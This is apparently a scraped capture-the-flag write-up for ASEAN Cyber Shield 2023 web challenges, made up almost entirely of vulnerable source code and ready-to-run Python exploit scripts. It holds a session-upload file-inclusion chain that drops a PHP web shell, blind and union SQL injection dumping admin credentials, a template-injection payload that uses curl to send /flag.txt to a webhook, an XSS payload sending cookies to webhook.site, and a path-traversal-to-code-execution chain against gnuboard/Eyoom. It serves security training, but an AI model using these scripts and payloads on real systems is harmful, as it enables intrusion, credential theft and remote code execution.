# ASEAN Cyber Shield (ACS) CTF 2023 [WEB]

> 原文: https://www.ctfiot.com/147517.html
> ID: 147517


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
```



```
<?php
session_start();
echo "<h2>Do you need phpinfo? ... or not?</h2>";

$num=$_GET['num'];
$page=$_GET['page'];

if(preg_match("/^[0-9+-\/\*e ]/i", $num)){
 exit("<h2>I hate number<h2>");
}

if(preg_match("/flag|\.|php|conf|\*|'|\"/i", $page)){
 exit("<h2>don't do that.</h2>");
}

if(is_numeric($num)){
 if($page==null){
 echo phpinfo();
 }else{
 include_once($page);
 }
}else{
 highlight_file(__FILE__);
}

?>
```



```
1
```



```
preg_match("/^[0-9+-\/\*e ]/i", $num)
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
```



```
%091
%0A1
%0B1
%0C1
%0D1
%201
%2B1
%2D1
%2E1
%301
%311
%321
%331
%341
%351
%361
%371
%381
%391
```



```
1
```



```
preg_match("/flag|\.|php|conf|\*|'|\"/i", $page)
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
```



```
import requests, sys, random, string, io 

host = sys.argv[1]
sess_save_path = '/tmp/83031eb8-41ac-11ee-b1b3-009337b0183d'
sess_id = ''.join(random.choice(string.digits) for _ in range(5))

cookies = { 'PHPSESSID': sess_id }
data = { 'PHP_SESSION_UPLOAD_PROGRESS': "<?php system($_GET['cmd']); ?>" }
files = { 'file': ('a', io.BytesIO(b'a')) }
requests.post(host, cookies=cookies, data=data, files=files)

params = {
 'num': '\x091',
 'page': sess_save_path + '/sess_' + sess_id,
 'cmd': 'cat /flag'
}
response = requests.get(host, cookies=cookies, params=params)

print(response.text)
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
```



```
import io
import sys
import requests
import threading

TARGET = sys.argv[1]
sessid = 'cmd'
sess_save_path = '/tmp/83031eb8-41ac-11ee-b1b3-009337b0183d/sess_'+sessid

def POST(session):
 while True:
 f = io.BytesIO(b'a' * 1024 * 1000)
 session.post(
 TARGET,
 data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php phpinfo();fputs(fopen('/var/www/html/shell.php','w'),'<?php system($_GET[0]); ?>');?>"},
 files={"file":('q.txt', f)},
 cookies={'PHPSESSID':sessid}
 )

def READ(session):
 while True:
 session.get(f'{TARGET}?num=%091&page={sess_save_path}')
 response = session.get(TARGET+"/shell.php?0=cat+/flag")
 if 'flag' not in response.text:
 print('[+++]retry')
 else:
 print(response.text)
 sys.exit(0)

with requests.session() as session:
 t1 = threading.Thread(target=POST, args=(session, ))
 t1.daemon = True
 t1.start()

 READ(session)
```



```
1
2
3
4
5
6
7
8
9
```



```
FROM php:7.4.33-apache
COPY index.php /var/www/html/
RUN echo "flag{fake}" > /flag
RUN cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini
RUN sed -i 's/;session.save_path = "\/tmp"/session.save_path = "\/tmp\/83031eb8-41ac-11ee-b1b3-009337b0183d"/g' /usr/local/etc/php/php.ini
RUN sed -i 's/;session.upload_progress.cleanup = On/session.upload_progress.cleanup = Off/g' /usr/local/etc/php/php.ini
USER www-data
RUN mkdir /tmp/83031eb8-41ac-11ee-b1b3-009337b0183d
EXPOSE 80
```



```
1
2
```



```
key = key.strip().lower()
key = key.replace('script','--').replace('onerror','--').replace('frame','--')
```



```
1
2
3
```



```
filename = request.form.get('filename')
if filename:
 return send_from_directory('captures', filename)
```



```
1
```



```
http://127.0.0.1:22225/api/test?key=<svg on onload="a=document.cookie;fetch(`http://webhook.site/a7ab6dad-6104-4e6b-a8c1-444a208a9d01/?c=`%2Ba)"></svg>
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
```



```
block_schemes = ["file", "gopher", "blob", "ftp", "glob", "data"]
block_host = ["localhost"]
input_scheme = urlparse(link_submitted).scheme
input_hostname = urlparse(link_submitted).hostname

if '://' not in link_submitted or 
 input_scheme in block_schemes or 
 input_hostname in block_host:
 return render_template('submit.html', message = "Link is not correct.", config = config)

if request.form.get('archive') == 'Y':
 uid = str(uuid4())
 message = message + "\nUID : " + uid
 t1 = threading.Thread(target = visit_with_screencapture, args = (link_submitted,request.form['secret'],uid,))
 t1.start()
```



```
1
2
3
4
5
6
7
8
9
10
11
```



```
def visit_with_screencapture(link_submitted, secret, uid):
 url = link_submitted.strip()
 if secret == config['secret']:
 try:
 browser.set_page_load_timeout(15)
 browser.get(config['host'])
 browser.get(url)
 sleep(1)
 filename = "captures/"+uid+".png"
 browser.get_screenshot_as_file(filename)
 browser.quit()
```



```
1
```



```
link= file:///flag&archive=Y&secret=redacted
```



```
1
2
3
4
5
6
7
8
9
10
11
```



```
router.post('/check_duplicate', function (request, response) {
 try{
 const id1 = request.body.username;
 if (id1.match(/'|_|or| |and|%20|\.|\(|\)/i)) {
 response.status(400).json({ error: 'Invalid input' });
 return;
 }
 const id2 = id1.replace(new RegExp('substr|mid|like|char|hex|ord', 'gi'), '');
 const id = decodeURIComponent(id2);
 const query = `SELECT * FROM user WHERE redacted1 = '${id}'`;
 db.query(query, function (error, results, fields) {
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
```



```
import requests, sys
import urllib3,urllib
import string
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def encode_all(string):
 a = "".join("%{0:0>2x}".format(ord(char)) for char in string)
 return a.replace("%20","/**/")

def sqli(q_left,chars): 
 # Register an account first with random userid
 data = """654321' and (%s)='%s""" % (q_left, chars)
 data = encode_all(data)
 data2 = {"username":data}
 r = requests.post(TARGET,data=data2)
 return "searchid" in r.text

def exploit(TARGET,SQL_TEMPLATE):
 i = 1
 dumped = ""
 dumped2 = ""
 while True:
 for chars in string.printable:
 if sqli(SQL_TEMPLATE%i,chars): 
 dumped += chars
 i+=1
 break
 if dumped == dumped2:
 break
 dumped2 = dumped
 return dumped

if __name__ == "__main__":
 TARGET = sys.argv[1]+"/auth/check_duplicate"

 # Enumerate Columns
 SQL_TEMPLATE = "select substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = 'acs_data' and table_name = 'user'),%s,1)"
 print(exploit(TARGET,SQL_TEMPLATE))

 # Enumerate username and password of admin
 SQL_TEMPLATE = "select substr((select group_concat(userid,':',passwd) from user where is_admin=1),%s,1)"
 print(exploit(TARGET,SQL_TEMPLATE))
```



```
1
2
```



```
└─$ grep -Hnri "\.render" | grep -i req
main.js:152: res.render('admin_board_detail', { ...req.query, post: result[0], isAdmin });
```



```
1
2
3
4
5
```



```
# Exfiltrate /flag.txt
/main/admin_notice/detail?no=1&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl "https://<webhook>/?c="`cat /flag.txt | base64 -w0`')

# Output the flag on the page (error)
main/admin_notice/detail?no=1&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('`cat /flag.txt`')
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
```



```
// Check if the $_SERVER['REQUEST_URI'] includes login2, SERVER, %
if(preg_match('/login2|SERVER|\%/i',$_SERVER['REQUEST_URI'])) die('[!] No hacking');

// Use extract() with $_GET variable
extract($_GET);

// Setting $secretid and $secretpw
$secretid = "admin";
$secretpw = rand(10000,99999);

// If get this value correctly $login will become 1
if(($secretid == $_GET['id']) and ($secretpw == $_GET['pw'])) $login = 1;

// Bypass this to get into include $include.
if($login == 1 && $_GET['login2'] == 2){
 disallow($include);
 include $include;
}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
```



```
<?php
// Check if the $_SERVER['REQUEST_URI'] includes login2, SERVER, %
if(preg_match('/login2|SERVER|\%/i',$_SERVER['REQUEST_URI'])) die('[!] No hacking');

// Use extract() with $_GET variable
extract($_GET);

echo "\$login = ";
echo var_dump($login);
echo " | \$_GET['login2'] = " ;
echo var_dump($_GET['login2']);

// Bypass this to get into include $include.
if($login == 1 && $_GET['login2'] == 2){
 disallow($include);
 include $include;
}
?>
```



```
1
```



```
FROM php:8.2.10-apache
```



```
1
```



```
FROM php:7.4.33-apache
```



```
1
2
```



```
└─$ curl -s "localhost/?login=1&_GET=2&include=PHP://filter/convert.base64-encode/resource=flag.php" | base64 -d
flag{fake}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
```



```
<?php
 function disallow($input) {
 // Check if the input starts with "php://"
 if (strpos($input, 'php://') === 0) {
 exit; // Disallow
 }
 }

 session_start();
 error_reporting(0);
 $time = 600;
 $now = time();
 
 if (isset($_SESSION['last_activity']) && ($now - $_SESSION['last_activity']) > $time) {
 session_unset(); session_destroy();
 }
 $_SESSION['last_activity'] = $now;
 if($_SERVER['REQUESTS_URI'] === '/') {
 header('Location: /index.php');
 exit;
 }
 if(preg_match('/login2|SERVER|\%/i',$_SERVER['REQUEST_URI'])) die('[!] No hacking');

 extract($_GET);
 $secretid = "admin";
 $secretpw = rand(10000,99999);
 
 if (!isset($_SESSION['guestpw'])) {
 $_SESSION['guestpw'] = rand(1000, 9999);
 }
 $guestpw = $_SESSION['guestpw'];

 if(($secretid == $_GET['id']) and ($secretpw == $_GET['pw'])) $login = 1;

 if($login == 1 && $_GET['login2'] == 2){
 disallow($include);
 include $include;
 }
 else if ($_POST['id'] === 'guest' && $_POST['pw'] === strval($guestpw)) {
 echo "<div class='message'>Login Success<hr></div>";
 result_();
 }
 else {
 echo "<div class='message'>Login Fail<hr></div>";
 }
?>
```



```
1
2
3
4
5
```



```
FROM php:7.4.33-apache
COPY index.php /var/www/html/
RUN echo "flag{fake}" > /var/www/html/flag.php
RUN cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini
EXPOSE 80
```



```
1
2
3
4
5
6
```



```
php > echo var_dump("1" == 1);
bool(true)
php > echo var_dump("1a" == 1);
bool(true)
php > echo var_dump("1abasasdasdasd" == 1);
bool(true)
```



```
1
2
3
4
5
```



```
sudo docker exec -it <docker_id> mariadb --user root -pgnuboard

SET global general_log = on;
SET global general_log_file='/var/log/mysql/mysql.log';
SET global log_output = 'file';
```



```
1
```



```
$type = isset($_REQUEST['type']) ? preg_replace("/[\<\>\'\"\\\'\\\"\%\=\(\)\s]/", "", $_REQUEST['type']) : '';
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
```



```
import requests, sys
import urllib.parse

payload = "1"
payload += " union select "
payload += "flag,"*89
payload += "flag FROM FLAG#"
payload = payload.replace(" ","/**/")
payload = urllib.parse.quote(payload)

r = requests.get(sys.argv[1]+"/shop/listtype.php?type="+payload)
if "ACS" in r.text:
 print(r.text)
```



```
1
2
```



```
└─$ python3 exploit.py http://192.168.48.130:20002 | grep -i 'ACS{'
ACS{fake_flag}
```



```
1
2
3
4
```



```
[Complementary measures based on recommendations from the Korea Internet & Security Agency]
- A security issue was discovered in the set_password() method and patched
- Security issues were found in record_dataupload() and record_datadrop() methods and patched
- An issue vulnerable to injection attacks was discovered when downloading attachments from the bulletin board, so this was patched
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
```



```
import requests,sys
import urllib3,urllib
import string
import io
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def auth_bypass(TARGET):
	data = """x'))))) or 1=1#"""
	headers = {
 "Referer":TARGET
	}
	data2 = {
 "redirect":"%2F",
 "id":"admin",
 "pwd":data
 }
	r = session.post(TARGET+"/sign/signin-submit?rewritetype=submit",data=data2,headers=headers)
	return "alert->location" in r.text

session = requests.Session()

if __name__ == "__main__":
 TARGET = sys.argv[1]
 if auth_bypass(TARGET):
 print(session.cookies)
 print("Bypass authentication")
```



```
1
2
3
```



```
└─$ python3 bypass_authentication.py http://192.168.48.130:22030
<RequestsCookieJar[<Cookie PHPSESSID=p9n41hva9q7b4v4n48hv4r2pph for 192.168.48.130/>]>
Bypass authentication
```



```
1
2
3
4
5
6
7
8
```



```
# (1) updatexml()
/mod/board/controller/result/result?board_id=123123' and updatexml(null,concat(0x0a,(select flag from flag)),null)-- -

# (2) extractvalue()
mod/board/controller/result/result?board_id=123123' and extractvalue(rand(),concat(0x3a,(SELECT flag FROM flag)))-- -

# (3) Basic
mod/board/controller/result/result?board_id=123123' or (select 1 and row(1,1)>(select count(*),concat(CONCAT((select flag from flag)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))-- -
```



```
1
```



```
When uploading an image file to a bulletin board developed with XpressEngine, a vulnerability in which an arbitrary file can be uploaded due to insufficient verification of the file. A remote attacker can use this vulnerability to execute arbitrary code on the server where the bulletin board is running.
```



```
1
```



```
/storage/app/public/media/public/media_library/19/61/20231126201643cee1cac995540c33e06d792e077297bd31e7e504.jpg
```



```
1
```



```
<?php system('cat /flag'); ?>
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
```



```
<?php
$preview = false;
include_once 'global.php';
if (!isset($_SESSION["user_id"])) {
 header("Location: login.php");
 exit();
}

$todos_fetch = mysqli_query($conn, "SELECT * FROM todos WHERE user_id = " . $_SESSION["user_id"]);
$todos_row = @mysqli_fetch_all($todos_fetch, MYSQLI_ASSOC);

$users_fetch = mysqli_query($conn, "SELECT * FROM users WHERE id = " . $_SESSION["user_id"]);
$user = @mysqli_fetch_array($users_fetch);

include_once 'theme.header.php';
include_once "./themes/".($preview?$theme['fname']:$user["theme"]);
include_once 'theme.footer.php';
?>
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
```



```
<?php
// Will replace /flag to f-l-a-g
// This function trying to stop us to read /flag
function badwordfiltering($string){
	$string = preg_replace("/flag/i", "f-l-a-g", $string);
	return $string;
}

// base64_decode(substr(base64_decode("<BASE64>"),1));
// Can add space infront of the first base64 for the substr(,1) function
function decrypt($string){
	$r = substr(base64_decode($string), 1);
	return base64_decode($r);
}

// set cookies preview_theme and add SQL payload
if(isset($_COOKIE['preview_theme'])){
	$preview_theme = badwordfiltering(htmlspecialchars(decrypt($_COOKIE['preview_theme'])));
 $themes_fetch = mysqli_query($conn, "SELECT * FROM themes WHERE tname = '$preview_theme'");
 $theme = @mysqli_fetch_array($themes_fetch);
 if($theme){
 $preview = true;
 }
}
?>
```



```
1
```



```
$sql = "UPDATE users SET theme = '$theme' WHERE id = " . $_SESSION['user_id'];
```



```
1
2
3
```



```
$a = htmlspecialchars(base64_decode(substr(base64_decode("IEp5QnZjaUF4UFRFZ0l3PT0="),1)));
$b = preg_replace("/flag/i", "f-l-a-g", $a);
echo $b;
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
```



```
import requests, sys
from base64 import b64encode

s = requests.Session()

url = sys.argv[1]

# Register + Login
data = {
	'username': 'username',
	'password': 'password'
}
res = s.post(url + '/register_process.php', data=data)
res = s.post(url + '/login_process.php', data=data)

# Bypass /flag with CONCAT()
cookies = {
	'preview_theme': b64encode(b' ' + b64encode(b"' union select 1,2,CONCAT('../../../../fla','g'),4 #")).decode()
}
res = s.get(url + '/index.php', cookies=cookies)
print(res.text)
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
```



```
public function set_user_theme($arr) {
 // Get $_COOKIE['unique_theme_id']
 if (get_cookie('unique_theme_id')) {
 $unique_theme_id = get_cookie('unique_theme_id');
 } else {
 $unique_theme_id = date('YmdHis', time()) . str_pad((int)(microtime()*100), 2, "0", STR_PAD_LEFT);
 set_cookie('unique_theme_id',$unique_theme_id,3600);
 }

 // The cookies value will ends with .php and save into $file variable
 $file = $this->tmp_path . '/' . $_SERVER['REMOTE_ADDR'] . '.' . $unique_theme_id . '.php';
 if (file_exists($file)) {
 // If the .php file exists it will include_once
 include_once($file);
 if ($is_shop_theme) {
 $arr['theme'] = $user_config['theme'];
 } else {
 $arr['shop_theme'] = $user_config['shop_theme'];
 }
 }

 // Save $arr value to $_config
 $_config = $arr;

 // Save the file in $file location with .php
 parent::save_file('user_config', $file, $_config);
}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
```



```
public function save_file($outvar, $filename, $info=array(), $int=false) {
 $fp = @fopen($filename, 'w');
 $contents = "<?php\n";
 $contents .= "if (!defined('_EYOOM_')) exit;\n";
 $contents .= "\$" . $outvar . " = array(\n";
 if ($info != NULL) {
 foreach ($info as $key => $value) {
 if (!is_array($value)) {
 if (!$int) {
 if (!is_int($key)) {
 $contents .= "\t\"" . $key . "\" => \"" . addslashes($value) . "\",\n";
 }
 } else $contents .= "\t\"" . $key . "\" => \"" . addslashes($value) . "\",\n";
 } else {
 $arr = '';
 foreach ($value as $k => $v) {
 if (!$int) {
 if (!is_int($key)) {
 $arr .= "\"" . $k . "\" => \"" . addslashes($v) . "\",";
 }
 } else $arr .= "\"" . $k . "\" => \"" . addslashes($v) . "\",";
 }
 if ($arr) {
 $arr = substr($arr,0,-1);
 $contents .= "\t\"" . $key . "\" => array(" . $arr . "),\n";
 }
 }
 }
 }

 $contents .= ");\n";
 @fwrite($fp, $contents);
 @fclose($fp);
 @chmod($filename, 0644);
}
```



```
1
2
3
4
5
6
7
8
```



```
function get_cookie($cookie_name)
{
 $cookie = md5($cookie_name);
 if (array_key_exists($cookie, $_COOKIE))
 return base64_decode($_COOKIE[$cookie]);
 else
 return "";
}
```



```
1
2
3
4
5
6
7
```



```
if (isset($_GET['theme']) || isset($_GET['shop_theme'])) {
 $_user['theme'] = clean_xss_tags(trim($_GET['theme']));
 $_user['shop_theme'] = clean_xss_tags(trim($_GET['shop_theme']));
 $_config = $this->set_user_theme($_user);
} else {
 $_config = $this->get_user_theme();
}
```



```
1
2
3
4
5
```



```
# use ?theme
curl "http://192.168.48.130:20007/?theme=test" -b "23ec334208a8862afdb7baa48ed00486=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3BvYw=="

# use ?shop_theme
curl "http://192.168.48.130:20007/?shop_theme=test" -b "23ec334208a8862afdb7baa48ed00486=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3BvYw=="
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
```



```
<?php
 // Load common.php
 $g5_path = '../../..';
 include_once($g5_path.'/common.php');

 // Check if $_POST['mb_id'] isset or not
 $mb_id = isset($_POST['mb_id']) ? trim($_POST['mb_id']) : '';
 if (!$mb_id) exit;

 // Check if file exists
 $push_file = $push_path.'/push.'.$mb_id.'.php';
 if (file_exists($push_file)) {
 include_once($push_file);
 } else exit;

 // Loop each $push_item array and check if got value or not
 $push_item = array(
 'respond',
 'memo',
 'follow',
 'unfollow',
 'subscribe',
 'upsubscribe',
 'likes',
 'guest',
 'levelup',
 'adopt',
 );

 foreach ($push_item as $val) {
 if ($push[$val]) {
 $item = $val;
 $push_tocken = true;
 break;
 }
 }

 // Check if $push_tocken true
 if ($push_tocken) {
 // Check if push[$item]['alarm'] got any value. If yes, it will trigger save_file()
 if (!$push[$item]['alarm']) {
 $push[$item]['alarm'] = true;
 $qfile = new qfile;
 $qfile->save_file('push',$push_file,$push);
 }
 }
```



```
1
2
3
4
5
```



```
# Base64 Encode
Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9odG1sL2RhdGEvbWVtYmVyL3B1c2gvcHVzaC5wb2M=

# Base64 Decode
../../../../../../../../var/www/html/data/member/push/push.poc
```



```
1
2
3
4
5
6
7
8
```



```
# Current path (html/eyoom/core/member/push_info.php)
$g5_path = '../../../';
include_once($g5_path.'/common.php');

# common.php (html/common.php)
@extract($_GET);
@extract($_POST);
@extract($_SERVER);
```



```
1
```



```
mb_id=poc&push[memo][alarm]=0&push[".phpinfo()."]=test
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
```



```
import requests, sys
import hashlib
import base64

s = requests.session()
TARGET = sys.argv[1]

# Login
data = {"url":"%2f","mb_id":"test1234","mb_password":"test123@!!!"}
r = s.post(TARGET+"/bbs/login_check.php",data=data, allow_redirects=False, proxies={"http":"127.0.0.1:8080"})
if r.status_code == 302:
 print("[+] Login Successfull")
else:
 exit()

# Create .php file
filename = b"shell"
cookies = {
 hashlib.md5(b"unique_theme_id").hexdigest(): base64.b64encode(b"../../../../../../../var/www/html/data/member/push/push."+filename).decode()
}
r = s.get(TARGET+"/?theme=poc",cookies=cookies, proxies={"http":"127.0.0.1:8080"})
print("[+] "+filename.decode()+".php created")

# Inject php code to read file
data = {
 "mb_id":filename,
 "push[memo][alarm]":0,
 "push[\".system(\"cat /flag\").\"]":"nothing"
}
r = s.post(TARGET+"/eyoom/core/member/push_info.php",data=data)
print("[+] Execute PHP file...")
r = s.post(TARGET+"/eyoom/core/member/push_info.php",data=data)
print(r.text)
```
